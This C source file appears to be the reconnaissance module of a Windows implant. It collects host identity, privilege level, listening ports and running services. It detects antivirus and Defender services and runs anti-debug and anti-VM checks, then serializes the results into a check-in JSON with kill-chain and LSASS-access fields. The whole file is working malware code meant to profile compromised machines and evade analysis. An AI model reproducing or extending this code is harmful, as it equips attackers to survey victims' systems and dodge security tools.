#include "recon.h"
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <lm.h>
#include <stdio.h>
#include "anti_analysis.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

// -- OS + privilege ---------------------------------------------------
static VOID collect_os(OUT CHAR* buf, DWORD size) {
    strcpy_s(buf, size, "Windows");
}

static VOID collect_privilege(OUT CHAR* buf, DWORD size) {
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elev = {0};
    DWORD dwSize = sizeof(elev);
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if(hToken ==NULL)
    {
        strcpy_s(buf,size,"unknown");
        return;
    }
    GetTokenInformation(hToken, TokenElevation,
                        &elev, sizeof(elev), &dwSize);
    CloseHandle(hToken);
    if (elev.TokenIsElevated)
        strcpy_s(buf, size, "admin");
    else
        strcpy_s(buf, size, "user");
}

// -- Port scan (top 20 common ports) ----------------------------------
static VOID collect_open_ports (OUT PCHECKIN_INFO pInfo){
    pInfo -> port_count =0;
    DWORD dwSize =0;
    GetExtendedTcpTable(NULL,&dwSize,FALSE,AF_INET, TCP_TABLE_BASIC_LISTENER,0);
    PMIB_TCPTABLE pTable =
        (PMIB_TCPTABLE)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (!pTable)
      return;

    if (GetExtendedTcpTable(pTable, &dwSize, FALSE, AF_INET,
                            TCP_TABLE_BASIC_LISTENER, 0) == NO_ERROR) {
      for (DWORD i = 0;
           i < pTable->dwNumEntries && pInfo->port_count < MAX_PORTS; i++) {
        DWORD port = ntohs((u_short)pTable->table[i].dwLocalPort);
        pInfo->open_ports[pInfo->port_count++] = port;
      }
    }
    HeapFree(GetProcessHeap(), 0, pTable);
}

// -- Running services via EnumServicesStatus --------------------------
static VOID collect_services(OUT PCHECKIN_INFO pInfo) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) return;
    DWORD needed = 0, count = 0, resume = 0;
    EnumServicesStatusA(hSCM,
                        SERVICE_WIN32, SERVICE_ACTIVE,
                        NULL, 0, &needed, &count, &resume);

    LPENUM_SERVICE_STATUSA pServices =
        (LPENUM_SERVICE_STATUSA)HeapAlloc(GetProcessHeap(), 0, needed);
    if (!pServices) { CloseServiceHandle(hSCM); return; }
    resume = 0;
    EnumServicesStatusA(hSCM, SERVICE_WIN32, SERVICE_ACTIVE,
                        pServices, needed, &needed, &count, &resume);
    pInfo->service_count = 0;
    for (DWORD i = 0;
         i < count && pInfo->service_count < MAX_SERVICES; i++) {
        strcpy_s(pInfo->running_services[pInfo->service_count++],
                 MAX_SVC_LEN,
                 pServices[i].lpServiceName);
    }
    HeapFree(GetProcessHeap(), 0, pServices);
    CloseServiceHandle(hSCM);
}

// -- Boolean flags ----------------------------------------------------
static BOOL collect_domain_joined() {
    NETSETUP_JOIN_STATUS status;
    LPWSTR pBuf = NULL;
    NetGetJoinInformation(NULL, &pBuf, &status);
    if (pBuf) NetApiBufferFree(pBuf);
    return (status == NetSetupDomainName);
}

static BOOL collect_av_running() {
    const char* av_services[] = {
        "MsMpSvc","WinDefend","avgnt","avast","mbamservice",NULL
    };
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) return FALSE;
    for (int i = 0; av_services[i]; i++) {
        SC_HANDLE h = OpenServiceA(hSCM, av_services[i], SERVICE_QUERY_STATUS);
        if (h) { CloseServiceHandle(h); CloseServiceHandle(hSCM); return TRUE; }
    }
    CloseServiceHandle(hSCM);
    return FALSE;
}



// -- Hostname, username, arch, IP -------------------------------------
static VOID collect_hostname(OUT CHAR* buf, DWORD size) {
    DWORD s = size;
    if (!GetComputerNameA(buf, &s)) strcpy_s(buf, size, "UNKNOWN");
}

static VOID collect_username(OUT CHAR* buf, DWORD size) {
    DWORD s = size;
    if (!GetUserNameA(buf, &s)) strcpy_s(buf, size, "UNKNOWN");
}

static VOID collect_arch(OUT CHAR* buf, DWORD size) {
    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    strcpy_s(buf, size,
             si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64
                 ? "x64" : "x86");
}

static VOID collect_ip(OUT CHAR* buf, DWORD size) {
    extern ULONG GetCurrentIpAddress();
    struct in_addr a;
    a.s_addr = GetCurrentIpAddress();
    strcpy_s(buf, size, inet_ntoa(a));
}

static VOID collect_os_version(OUT CHAR* buf, DWORD size) {
    typedef NTSTATUS(NTAPI* fnRtlGetVersion)(PRTL_OSVERSIONINFOW);
    fnRtlGetVersion pRtlGetVersion =
        (fnRtlGetVersion)GetProcAddress(
            GetModuleHandleA("ntdll"), "RtlGetVersion");
    RTL_OSVERSIONINFOW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (pRtlGetVersion) pRtlGetVersion(&osvi);
    sprintf_s(buf, size, "Windows %lu.%lu Build %lu",
              osvi.dwMajorVersion,
              osvi.dwMinorVersion,
              osvi.dwBuildNumber);
}

// -- PUBLIC API -------------------------------------------------------
BOOL recon_collect(OUT PCHECKIN_INFO pInfo) {
    ZeroMemory(pInfo, sizeof(CHECKIN_INFO));
    collect_os(pInfo->os, sizeof(pInfo->os));
    collect_privilege(pInfo->privilege_level,
                      sizeof(pInfo->privilege_level));
    collect_open_ports(pInfo);
    collect_services(pInfo);
    pInfo->domain_joined     = collect_domain_joined();
    pInfo->antivirus_running = collect_av_running();
    pInfo->is_debugged = anti_debug_check();
    pInfo->is_vm = anti_vm_check();
    collect_hostname(pInfo->hostname, sizeof(pInfo->hostname));
    collect_username(pInfo->username, sizeof(pInfo->username));
    collect_os_version(pInfo->os_version, sizeof(pInfo->os_version));
    pInfo->pid = GetCurrentProcessId();
    collect_arch(pInfo->arch, sizeof(pInfo->arch));
    collect_ip(pInfo->ip, sizeof(pInfo->ip));
    strcpy_s(pInfo->current_phase, sizeof(pInfo->current_phase),
             "discovery");
    return TRUE;
}

// -- Serialize to JSON matching Braeden's AgentFindings schema --------
BOOL recon_serialize(IN PCHECKIN_INFO pInfo,
                     OUT CHAR** ppJson, OUT DWORD* pdwLen) {
    CHAR* buf = (CHAR*)HeapAlloc(GetProcessHeap(), 0, 4096);
    if (!buf) return FALSE;

    // build ports array string
    CHAR ports[256] = "[";
    for (DWORD i = 0; i < pInfo->port_count; i++) {
        CHAR tmp[16];
        sprintf_s(tmp, sizeof(tmp), "%lu", pInfo->open_ports[i]);
        strcat_s(ports, sizeof(ports), tmp);
        if (i < pInfo->port_count - 1)
            strcat_s(ports, sizeof(ports), ",");
    }
    strcat_s(ports, sizeof(ports), "]");

    // build services array string
    CHAR svcs[512] = "[";
    for (DWORD i = 0; i < pInfo->service_count; i++) {
        strcat_s(svcs, sizeof(svcs), "\"");
        strcat_s(svcs, sizeof(svcs), pInfo->running_services[i]);
        strcat_s(svcs, sizeof(svcs), "\"");
        if (i < pInfo->service_count - 1)
            strcat_s(svcs, sizeof(svcs), ",");
    }
    strcat_s(svcs, sizeof(svcs), "]");

    // serialize -- matches Braeden's AgentFindings schema exactly
    sprintf_s(buf, 4096,
        "{"
        "\"os\":\"%s\","
        "\"privilege_level\":\"%s\","
        "\"open_ports\":%s,"
        "\"running_services\":%s,"
        "\"domain_joined\":%s,"
        "\"active_directory\":%s,"
        "\"antivirus_running\":%s,"
        "\"lsass_accessible\":%s,"
        "\"ntlm_auth\":%s,"
        "\"current_kill_chain_phase\":\"%s\","
        "\"hostname\":\"%s\","
        "\"username\":\"%s\","
        "\"os_version\":\"%s\","
        "\"pid\":%lu,"
        "\"arch\":\"%s\","
        "\"ip\":\"%s\","
        "\"is_debugged\":%s,"
        "\"is_vm\":%s"
        "}",
        pInfo->os,
        pInfo->privilege_level,
        ports, svcs,
        pInfo->domain_joined     ? "true" : "false",
        pInfo->active_directory  ? "true" : "false",
        pInfo->antivirus_running ? "true" : "false",
        pInfo->lsass_accessible  ? "true" : "false",
        pInfo->ntlm_auth        ? "true" : "false",
        pInfo->current_phase,
        pInfo->hostname,
        pInfo->username,
        pInfo->os_version,
        pInfo->pid,
        pInfo->arch,
        pInfo->ip,
        pInfo->is_debugged ? "true" : "false",
        pInfo->is_vm       ? "true" : "false"
    );

    *ppJson = buf;
    *pdwLen = (DWORD)strlen(buf);
    return TRUE;
}

// -- Debug print ------------------------------------------------------
VOID recon_print(IN PCHECKIN_INFO pInfo) {
    printf("[RECON] OS:         %s\n", pInfo->os);
    printf("[RECON] Privilege:  %s\n", pInfo->privilege_level);
    printf("[RECON] Hostname:   %s\n", pInfo->hostname);
    printf("[RECON] Username:   %s\n", pInfo->username);
    printf("[RECON] OS Version: %s\n", pInfo->os_version);
    printf("[RECON] PID:        %lu\n", pInfo->pid);
    printf("[RECON] Arch:       %s\n", pInfo->arch);
    printf("[RECON] IP:         %s\n", pInfo->ip);
    printf("[RECON] Ports:      %lu open\n", pInfo->port_count);
    printf("[RECON] Services:   %lu running\n", pInfo->service_count);
    printf("[RECON] Domain:     %s\n", pInfo->domain_joined ? "yes" : "no");
    printf("[RECON] AV:         %s\n", pInfo->antivirus_running ? "yes" : "no");
    printf("[RECON] Debugged:   %s\n", pInfo->is_debugged ? "yes" : "no");
    printf("[RECON] VM:         %s\n", pInfo->is_vm ? "yes" : "no");
    printf("[RECON] Phase:      %s\n", pInfo->current_phase);
}
